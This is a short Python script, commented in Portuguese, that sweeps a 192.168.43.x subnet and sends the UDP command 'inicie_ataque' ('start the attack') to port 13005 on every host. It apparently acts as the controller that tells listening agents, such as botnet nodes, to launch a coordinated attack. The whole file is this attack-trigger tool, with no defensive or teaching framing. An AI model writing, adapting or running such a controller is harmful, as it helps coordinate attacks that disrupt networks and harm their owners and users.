import sys
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread

#Funcao que manda o comando
def mandando():

	i = 0

	while(i<255):

		#Define o IP que vai enviar o ataque
		SERVER_IP   = '192.168.43.'+str(i)

		i=i+1

		#Porta do Ataque
		PORT_NUMBER = 13005

		#Buffer
		SIZE = 1024

		#Mostra na tela
		print ("Enviando para o IP {0} na porta {1}\n".format(SERVER_IP, PORT_NUMBER))

		#Socket criado
		mySocket = socket( AF_INET, SOCK_DGRAM )

		#Enviando a mensagem comece
		mySocket.sendto('inicie_ataque',(SERVER_IP,PORT_NUMBER))



#Thread que ira inicar o ataque
mandando1 =Thread(target=mandando)

#Comeca o ataque
mandando1.start()

